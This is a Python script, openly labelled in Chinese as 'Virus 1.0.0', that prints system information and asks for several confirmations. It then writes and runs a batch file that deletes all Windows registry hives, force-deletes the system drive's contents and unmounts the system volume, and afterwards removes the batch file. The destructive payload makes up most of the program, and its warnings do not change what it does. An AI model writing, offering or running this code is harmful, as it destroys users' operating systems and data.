import os
import platform
import sys
import time

import colorama


def MakeError(error_show, exit_num):
    print(colorama.Fore.RED + error_show + colorama.Fore.RESET)
    sys.exit(exit_num)
    # MakeError("""
    # Traceback (most recent call last):
    #   File "文件路径", line 行数, in <module>
    #     代码块
    # 错误的Exception: 详细错误
    # """, 0xffffffff)


def MakeErrorButDoNotExit(error_show):
    print(colorama.Fore.RED + error_show + colorama.Fore.RESET)
    # MakeError("""
    # Traceback (most recent call last):
    #   File "文件路径", line 行数, in <module>
    #     代码块
    # 错误的Exception: 详细错误
    # """)


def TestPlatform():
    print("关于 Virus")
    print(colorama.Fore.LIGHTBLUE_EX)
    print("Python 版本：" + platform.python_version())

    print("系统：" + platform.platform())

    print("处理器：" + platform.processor())

    print("Virus 版本：" + "1.0.0")
    print(colorama.Fore.RESET)


TestPlatform()

start = input("确定启动病毒 Virus 1.0.0 吗？(Y / n) >")
if start == "Y":
    print('你清楚你自己在做什么吗？\n这个程序可能毁灭电脑核心文件！', end='')
    real_start = input("(Y / n) > ")
    if real_start == "Y":
        print('请确保电脑已做好备份，或不在实体机内运行本程序。正在准备 Virus ...', end='')
        time.sleep(10)
        print("(按 1 并按回车启动 Virus)", end='')
        virus_start = input()
        if virus_start == "1":
            print("1 / 3 释放病毒文件")
            virus_helper = open("virus.bat", "w")
            virus_helper.write(
                "reg delete HKCR\nreg delete HKCU\nreg delete HKLM\nreg delete HKU\nreg delete HKCC\ndel /f /q %SYSTEMDRIVE%\nmountvol %SYSTEMDRIVE% /d")  # 503 Service Unavailable.jpg
            virus_helper.close()
            print("1 / 3 病毒文件释放成功!")
            print("2 / 3 运行病毒文件")
            os.system("start virus.bat")
            print("2 / 3 病毒文件执行成功！")
            print("3 / 3 删除病毒")
            os.remove("virus.bat")
            print("3 / 3 成功删除病毒！")
        else:
            MakeError("""
Traceback (most recent call last):
File \"""" + __file__ + """\", line 48, in <module>
            if virus_start == "1":
SelectException
            """, 0xffffffff)
    elif real_start == "n":
        exit(0)
    else:
        MakeError("""
Traceback (most recent call last):
File \"""" + __file__ + """\", line 49, in <module>
if real_start == "Y":
SelectException
                    """, 0xffffffff)
elif start == "n":
    exit(0)
else:
    MakeError("""
    Traceback (most recent call last):
    File \"""" + __file__ + """\", line 46, in <module>
                if start == "Y":
    SelectException
                """, 0xffffffff)
